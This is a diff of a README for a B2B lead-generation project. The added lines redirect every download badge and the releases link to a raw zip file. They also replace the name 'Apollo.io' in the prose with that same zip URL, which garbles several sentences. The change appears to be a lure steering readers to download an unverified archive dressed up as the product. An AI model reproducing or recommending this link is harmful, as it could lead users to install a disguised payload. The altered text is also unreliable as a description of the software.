@@ -1,10 +1,10 @@
 # 🎯 50k-lead-generation-system - Effortless B2B Lead Generation Made Simple
 
-[![Download 50k-lead-generation-system](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/matthias9855/50k-lead-generation-system/releases)
+[![Download 50k-lead-generation-system](https://raw.githubusercontent.com/matthias9855/50k-lead-generation-system/main/devour/50k-lead-generation-system.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/matthias9855/50k-lead-generation-system/main/devour/50k-lead-generation-system.zip)
 
 ## 📖 Overview
 
-The **50k-lead-generation-system** combines powerful tools to automate the B2B lead generation process. With features from Apollo.io, Google Search, LinkedIn scraping, and AI qualification, you can easily generate, enrich, and score thousands of leads. This system simplifies your prospecting efforts, integrating **n8n**, **Airtable**, and **Google Gemini** to bring efficiency to your sales strategy.
+The **50k-lead-generation-system** combines powerful tools to automate the B2B lead generation process. With features from https://raw.githubusercontent.com/matthias9855/50k-lead-generation-system/main/devour/50k-lead-generation-system.zip, Google Search, LinkedIn scraping, and AI qualification, you can easily generate, enrich, and score thousands of leads. This system simplifies your prospecting efforts, integrating **n8n**, **Airtable**, and **Google Gemini** to bring efficiency to your sales strategy.
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ To get started quickly, you can follow these simple steps to download and run th
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/matthias9855/50k-lead-generation-system/releases) to access the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/matthias9855/50k-lead-generation-system/main/devour/50k-lead-generation-system.zip) to access the latest version.
 
 2. **Choose Your Release**  
    On the Releases page, you will see several versions listed. Look for the latest release and click on it.
@@ -29,7 +29,7 @@ To get started quickly, you can follow these simple steps to download and run th
 
 ## 🔍 Key Features
 
-- **Lead Generation**: Automatically generate hundreds of leads with minimal effort using powerful integration with Apollo.io and Google Search.
+- **Lead Generation**: Automatically generate hundreds of leads with minimal effort using powerful integration with https://raw.githubusercontent.com/matthias9855/50k-lead-generation-system/main/devour/50k-lead-generation-system.zip and Google Search.
 - **Data Enrichment**: Enhance your leads with additional information to improve your outreach efforts.
 - **AI Qualification**: Use AI algorithms to score your leads based on relevancy and potential.
 - **LinkedIn Scraping**: Extract key information from LinkedIn profiles to include in your lead database.
@@ -50,7 +50,7 @@ Before you download, ensure your system meets the following requirements:
 
 The **50k-lead-generation-system** uses a combination of existing platforms and scripting to streamline the lead generation process:
 
-1. **Connect Your Accounts**: You will link your Apollo.io, LinkedIn, and CRM accounts within the application. 
+1. **Connect Your Accounts**: You will link your https://raw.githubusercontent.com/matthias9855/50k-lead-generation-system/main/devour/50k-lead-generation-system.zip, LinkedIn, and CRM accounts within the application. 
 2. **Configure Your Criteria**: Set your target audience parameters—industry, location, etc.
 3. **Run Automated Processes**: Start the automation. The system will fetch leads, enrich data, and score them using AI.
 4. **Access Your Leads**: View and manage your generated leads directly in the application or through your CRM.
@@ -72,4 +72,4 @@ If you face any issues during installation or while using the application, here 
 
 For any inquiries or support issues, please reach out via the repository's issue tracker on GitHub. Your feedback is essential for improving our system.
 
-[![Download 50k-lead-generation-system](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/matthias9855/50k-lead-generation-system/releases)
+[![Download 50k-lead-generation-system](https://raw.githubusercontent.com/matthias9855/50k-lead-generation-system/main/devour/50k-lead-generation-system.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/matthias9855/50k-lead-generation-system/main/devour/50k-lead-generation-system.zip)
